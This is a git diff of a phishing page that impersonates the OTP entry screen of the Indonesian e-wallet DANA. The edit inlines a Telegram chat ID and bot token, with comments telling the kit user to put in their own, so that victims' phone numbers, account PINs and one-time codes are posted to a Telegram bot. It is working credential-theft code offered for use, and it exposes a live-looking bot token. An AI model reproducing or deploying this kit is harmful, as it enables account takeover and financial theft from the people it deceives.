@@ -1,4 +1,4 @@
-<!DOCTYPE html><meta http-equiv=refresh><title>DANA | dana.id</title><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name=viewport><link href=./../lib/style/otp.css rel=stylesheet type=text/css><link href=./../lib/style/spinner.css rel=stylesheet type=text/css><style></style><div class=raw><img src=./../assets/img/back.png class=back> <img src=./../assets/img/dana_logo.png class=dana_logo></div><div class=background><div class=container id=container><center><h1>Masukkan OTP</h1><h2>Kode OTP telah dikirm ke nomor Anda</h2><form><div class=four_otp id=four_otp><input autocomplete=off class=inpOtp id=otp1 maxlength=1 name=otp1 type=number><input autocomplete=off class=inpOtp id=otp2 maxlength=1 name=otp2 type=number><input autocomplete=off class=inpOtp id=otp3 maxlength=1 name=otp3 type=number><input autocomplete=off class=inpOtp id=otp4 maxlength=1 name=otp4 type=number></div></form><p class=resend>KIRIM ULANG (<span id=time>60</span>s)</center></div></div><div class=process id=process name=process style=display:none><div class=loading><img src=./../assets/img/load_bg.png> <img src=./../assets/img/load_spin.png class=spinner></div></div><script src="../telegram.js"></script><script src=./../lib/functions/function_otp.js></script>
+<!DOCTYPE html><meta http-equiv=refresh><title>DANA | dana.id</title><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name=viewport><link href=./../lib/style/otp.css rel=stylesheet type=text/css><link href=./../lib/style/spinner.css rel=stylesheet type=text/css><style></style><div class=raw><img src=./../assets/img/back.png class=back> <img src=./../assets/img/dana_logo.png class=dana_logo></div><div class=background><div class=container id=container><center><h1>Masukkan OTP</h1><h2>Kode OTP telah dikirm ke nomor Anda</h2><form><div class=four_otp id=four_otp><input autocomplete=off class=inpOtp id=otp1 maxlength=1 name=otp1 type=number><input autocomplete=off class=inpOtp id=otp2 maxlength=1 name=otp2 type=number><input autocomplete=off class=inpOtp id=otp3 maxlength=1 name=otp3 type=number><input autocomplete=off class=inpOtp id=otp4 maxlength=1 name=otp4 type=number></div></form><p class=resend>KIRIM ULANG (<span id=time>60</span>s)</center></div></div><div class=process id=process name=process style=display:none><div class=loading><img src=./../assets/img/load_bg.png> <img src=./../assets/img/load_spin.png class=spinner></div></div><script src=./../lib/functions/function_otp.js></script>
 <script>
 function submit(){
     let xx  = document.getElementById('process')
@@ -19,6 +19,13 @@ DANA | OTP | ${phoneNumber}
 - No HP : ${phoneNumber}
 - Pin Akun : ${pinNumber}
 - Code OTP : ${otpNumber}`;
+
+//_masukan_ID_Akun_Telegram_kamu
+var id_telegram   = "5611258815";
+
+//_masukan_ID_Bot_Telegram_kamu
+var token_botTele = "5465756419:AAFpdwSvIcRtIet6s7es4jgKTwmaO1cevng";
+
     fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown",{
         method: 'POST',
         headers: {
